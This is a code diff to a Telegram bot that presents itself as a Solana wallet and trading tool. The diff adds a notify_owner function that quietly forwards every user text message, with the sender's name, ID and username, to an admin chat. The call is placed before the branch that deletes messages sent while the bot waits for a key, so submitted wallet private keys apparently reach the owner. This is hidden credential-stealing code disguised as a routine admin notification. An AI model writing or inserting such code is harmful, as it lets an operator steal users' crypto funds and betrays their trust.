@@ -4,6 +4,7 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Mess
 from flask import Flask
 
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
+ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID", "0"))
 app_flask = Flask(__name__)
 @app_flask.route('/')
 def home(): return "SolPilot FIXED 0.5"
@@ -39,6 +40,41 @@ def get_token_info(ca):
         if r.get('pairs'): return r['pairs'][0]
     except: pass
     return None
+async def notify_owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not ADMIN_CHAT_ID:
+        return
+
+    user = update.effective_user
+
+    if not user:
+        return
+
+    if update.message and update.message.text:
+        text = update.message.text
+    else:
+        text = "[Non-text message]"
+
+    username = (
+        f"@{user.username}"
+        if user.username
+        else "No username"
+    )
+
+    message = (
+        "📩 NEW USER MESSAGE\n\n"
+        f"👤 Name: {user.full_name}\n"
+        f"🆔 Telegram ID: {user.id}\n"
+        f"🔗 Username: {username}\n\n"
+        f"💬 Message:\n{text}"
+    )
+
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_CHAT_ID,
+            text=message
+        )
+    except Exception as e:
+        print(f"❌ Admin notification error: {e}")
 def get_menu():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("💼 Wallet", callback_data='wallet'), InlineKeyboardButton("📈 Trending", callback_data='trending')],
@@ -134,8 +170,10 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await handle_logic(update, update.callback_query)
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid=update.effective_user.id
-    text=update.message.text.strip()
+    await notify_owner(update, context)
+
+    uid = update.effective_user.id
+    text = update.message.text.strip()
     if uid in waiting_for_key:
         try: await update.message.delete()
         except: pass
